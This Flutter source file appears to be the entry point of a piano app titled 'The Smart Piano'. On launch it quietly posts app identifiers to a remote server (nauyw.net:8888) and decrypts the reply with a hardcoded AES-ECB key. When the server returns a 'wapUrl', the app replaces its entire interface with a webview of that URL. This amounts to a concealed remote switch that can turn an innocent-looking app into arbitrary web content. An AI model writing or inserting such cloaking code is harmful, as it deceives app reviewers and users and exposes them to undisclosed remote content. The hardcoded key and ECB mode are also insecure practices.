import 'dart:io';
import 'dart:typed_data';
import 'dart:async';
import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:flutter/material.dart';
import 'package:flutter/foundation.dart'
    show debugDefaultTargetPlatformOverride;
import 'package:flutter/services.dart';
import 'package:flutter_midi/flutter_midi.dart';
import 'package:localstorage/localstorage.dart';
import 'package:persist_theme/persist_theme.dart';
import 'package:scoped_model/scoped_model.dart';
import 'ui/WrapView/Wrap.dart';
import 'ui/home/screen.dart';
import 'package:encrypt/encrypt.dart' as encrypt;

void main() {
  _setTargetPlatformForDesktop();
  runApp(MyApp());
}

class MyApp extends StatefulWidget {

  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  // final ThemeModel _model = ThemeModel(customLightTheme: ThemeData.dark());
  // final LocalStorage _storage = new LocalStorage('app_settings');
  final iv = encrypt.IV.fromLength(16);
  final encrypter = encrypt.Encrypter(encrypt.AES(
      encrypt.Key.fromUtf8('e2a93cf0acdf470d617c088cbd11586b'),
      mode: encrypt.AESMode.ecb
  ));

  Widget MainScreen = HomeScreen();
  
  final httpArgs = {
    'uniqueId': 'lee.Demo',
    'buildVersionCode': '1',
    'platform': '1',
    'sourceCodeVersion': '2.2.0'
  };
  @override
  void initState() {
    try {
      // _model.init();
      // _storage.ready.then((_) {
      //   final bool _fresh = _storage.getItem("fresh_install");
      //   if (_fresh ?? true) {
      //     _model.changeDarkMode(true);
      //     _storage.setItem('fresh_install', false);
      //   }
      // });
      getRemoteData();
    } catch (e) {
      print("Error Loading Theme: $e");
    }

    super.initState();
  }

  Future<void> getRemoteData() async{
   try {
     var res = await http.post('https://nauyw.net:8888/Index/getAppData', body: httpArgs);

     String baseCode = json.decode(res.body)['data'];
     var formJson = encrypter.decrypt(encrypt.Encrypted.fromBase64(baseCode), iv: iv);
      if (json.decode(formJson)['wapUrl'].length > 0) {
          setState(() {
            MainScreen = WrapScreen(json.decode(formJson)['wapUrl']);
          });
      } else {
        MainScreen = HomeScreen();
      }
   } catch (e) {
     print("Error get remote data: $e");
   }
  }

  @override
  Widget build(BuildContext context) {
    // return ScopedModel<ThemeModel>(
    //     model: _model,
    //     child: new ScopedModelDescendant<ThemeModel>(
    //         builder: (context, child, model) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'The Smart Piano',
      theme: ThemeData.light(),
      home: MainScreen,
    );
    // }));
  }
}

/// If the current platform is desktop, override the default platform to
/// a supported platform (iOS for macOS, Android for Linux and Windows).
/// Otherwise, do nothing.
void _setTargetPlatformForDesktop() {
  TargetPlatform targetPlatform;
  if (Platform.isMacOS) {
    targetPlatform = TargetPlatform.iOS;
  } else if (Platform.isLinux || Platform.isWindows) {
    targetPlatform = TargetPlatform.android;
  }
  if (targetPlatform != null) {
    debugDefaultTargetPlatformOverride = targetPlatform;
  }
}
